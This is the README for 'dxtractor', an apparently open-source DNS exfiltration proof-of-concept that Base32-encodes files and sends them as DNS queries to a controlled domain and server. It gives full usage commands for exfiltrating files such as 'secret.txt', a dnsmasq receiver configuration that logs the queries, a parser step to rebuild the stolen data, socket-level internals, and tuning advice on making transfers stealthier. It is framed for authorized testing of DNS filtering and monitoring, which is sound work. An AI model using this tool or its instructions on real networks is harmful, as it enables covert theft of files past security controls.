# dxtractor

---

## Overview

**dxtractor** is a cross-platform DNS exfiltration proof-of-concept that encodes arbitrary files using **Base32** and transmits them through DNS queries.

It is designed for:

* DNS exfiltration testing
* Network visibility validation
* Security control evaluation (e.g., CASB, DNS filtering, EDR telemetry)

Supported platforms:

* Linux
* Windows
* macOS

---

## How it works

dxtractor performs file exfiltration over DNS using a structured approach:

1. Reads the target file as raw bytes
2. Encodes data using **Base32 (RFC4648, no padding)**
3. Splits the encoded stream into DNS-safe chunks
4. Sends each chunk as a DNS query:

```
<sequence>.<session>.<data>.<domain>
```

5. Sends a termination marker:

```
999.<session>.END.<domain>
```

This allows full reconstruction using a parser.

---

## Usage

```
dxtractor <file> <domain> <dns_server> [-p port] [-d delay] [-c chunk]
```

---

## Parameters

| Parameter  | Description                        |
| ---------- | ---------------------------------- |
| file       | File to exfiltrate                 |
| domain     | Controlled domain                  |
| dns_server | DNS server IP                      |
| -p         | DNS port (default: 5353)           |
| -d         | Delay between requests (seconds)   |
| -c         | Chunk size (multiple of 8, max 56) |

---

## Examples

Basic:

```
dxtractor secret.txt dnstest.test 10.10.10.10
```

With delay:

```
dxtractor secret.txt dnstest.test 10.10.10.10 -d 1
```

Custom chunk:

```
dxtractor secret.txt dnstest.test 10.10.10.10 -c 32
```

Full control:

```
dxtractor secret.txt dnstest.test 10.10.10.10 -p 53 -d 1 -c 24
```

---

## Compilation

### Linux / macOS

```
gcc dns_extractor_linux.c -o dxtractor
```

or

```
gcc dns_extractor_mac.c -o dxtractor
```

---

### Windows (MinGW)

```
x86_64-w64-mingw32-gcc dns_extractor_windows.c -o dxtractor.exe -lws2_32
```

---

## DNS Receiver Setup (dnsmasq)

dxtractor relies on a DNS server that logs incoming queries.

---

### Example configuration

Edit:

```
/etc/dnsmasq.conf
```

Add:

```
port=5353
log-queries
log-facility=/var/log/dnsmasq.log

listen-address=<DNS_SERVER_IP>
bind-interfaces

interface=<INTERFACE>
except-interface=lo

address=/dnstest.test/<DNS_SERVER_IP>
```

---

### Replace values

| Field             | Description                           |
| ----------------- | ------------------------------------- |
| `<DNS_SERVER_IP>` | Your DNS listener IP                  |
| `<INTERFACE>`     | Network interface (e.g., eth0, ens33) |

---

## Start dnsmasq

```
sudo systemctl restart dnsmasq
```

---

## Validate service

```
sudo systemctl status dnsmasq
```

Expected:

```
Active: active (running)
```

---

## Monitor incoming queries

```
sudo tail -f /var/log/dnsmasq.log
```

Expected output:

```
query[A] 0.1234.IFBEGRCF...dnstest.test from 192.168.1.50
```

---

## Functional validation

Before exfiltration, confirm DNS resolution:

```
nslookup test.dnstest.test <DNS_SERVER_IP>
```

Expected:

```
Name: test.dnstest.test
Address: <DNS_SERVER_IP>
```

---

## Running dxtractor

```
./dxtractor file.txt dnstest.test <DNS_SERVER_IP>
```

You should observe live DNS queries being logged.

---

## Data reconstruction

Use the provided parser:

```
python3 parser.py
```

The parser:

* Extracts Base32 chunks
* Reorders them using sequence numbers
* Decodes the original file

---

## Low-Level API & Networking Internals

dxtractor uses **low-level socket APIs** instead of high-level libraries, giving full control over packet construction and transmission.

---

### Windows (WinAPI / Winsock)

Networking is handled through **Winsock (`ws2_32.dll`)**.

#### APIs used

| API           | Purpose            |
| ------------- | ------------------ |
| `WSAStartup`  | Initialize Winsock |
| `socket`      | Create UDP socket  |
| `sendto`      | Send DNS packet    |
| `closesocket` | Close socket       |
| `WSACleanup`  | Cleanup Winsock    |
| `inet_pton`   | Convert IP address |

#### Execution flow

1. Initialize networking:

```
WSAStartup(MAKEWORD(2,2), &wsa);
```

2. Create UDP socket:

```
socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
```

3. Build DNS packet manually:

* Header (`dns_header`)
* QNAME (label format)
* Query type (A)
* Query class (IN)

4. Send packet:

```
sendto(...)
```

5. Cleanup resources

---

### Linux / macOS (POSIX)

Uses standard **POSIX sockets**.

#### APIs used

| API         | Purpose           |
| ----------- | ----------------- |
| `socket`    | Create UDP socket |
| `sendto`    | Send packet       |
| `close`     | Close socket      |
| `inet_pton` | Convert IP        |

#### Execution flow

1. Create socket:

```
socket(AF_INET, SOCK_DGRAM, 0);
```

2. Prepare destination (`sockaddr_in`)

3. Build DNS packet manually

4. Send:

```
sendto(...)
```

---

### Manual DNS Packet Construction

dxtractor builds DNS packets from scratch:

* Header:

  * Transaction ID
  * Flags (standard query)
  * Question count

* QNAME:

  * Converted to label format:

```
www.example.com → 3www7example3com0
```

* Query:

  * Type: A (1)
  * Class: IN (1)

This allows full control over payload structure.

---

## Notes

* Base32 avoids DNS case sensitivity issues
* Chunk size must be ≤56 and multiple of 8
* Smaller chunks = stealthier, slower
* Larger chunks = faster, noisier
* Port flexibility allows testing filtering behavior

---

## Troubleshooting

### No queries received

* Check DNS server IP
* Verify port matches (`-p`)
* Ensure dnsmasq is running
* Check interface binding

---

### `<name unprintable>` in logs

* Invalid chunk size
* Must be multiple of 8

---

### Works on Linux/Windows but not macOS

* macOS may restrict raw DNS behavior
* Try different ports (`53` vs `5353`)

---

## Disclaimer

This project is intended for **educational purposes and authorized security testing only**.

Unauthorized use may violate laws and policies.

---

## Author

☠️ **b5null**
